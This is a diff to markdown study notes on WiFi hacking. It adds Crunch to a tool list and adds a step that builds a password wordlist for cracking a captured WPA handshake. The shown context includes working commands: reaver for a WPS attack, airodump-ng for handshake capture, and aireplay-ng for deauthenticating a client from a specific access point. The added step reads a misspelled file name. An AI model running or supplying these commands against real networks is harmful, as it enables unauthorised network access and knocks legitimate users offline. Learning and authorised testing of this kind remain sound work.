@@ -17,6 +17,7 @@ Network Hacking and gaining access to Wifi networks and cracking them.
 - aircrack-ng
 - WASH
 - aireplay-ng
+- Crunch
 
 ## Steps for WAP
 
@@ -74,7 +75,7 @@ reaver --bssid 78:67:0E:31:4C:42 --channel 1 --interface wlan0 -vvv --no-associa
 **Method for capturing handshake**
 
 - Find the BSSID of the network with ifconfig
-- Write a file via airodump-ng
+- Write a file via **airodump-ng**.
 ```bash
 root@kali:~# airodump-ng --bssid 30:DE:4B:AD:CC:8A --channel 161 --write wpa_handshake wlan0 
 ```
@@ -83,7 +84,11 @@ root@kali:~# airodump-ng --bssid 30:DE:4B:AD:CC:8A --channel 161 --write wpa_han
 aireplay-ng --deauth 4 -a 30:DE:4B:AD:CC:8A -c EE:7B:BE:70:D6:1F wlan0
 ```
 - The handshake WPA will be saved in the file we created wpa_handshake.cap
-- 
+- We will create a wordlist of passwords possibilities using the tool **Crunch**. Then read the file
+```bash
+crunch 1 3 abc123 -o test_wordlist.txt
+cat test_worklist.txt
+```
 
 
 ￼
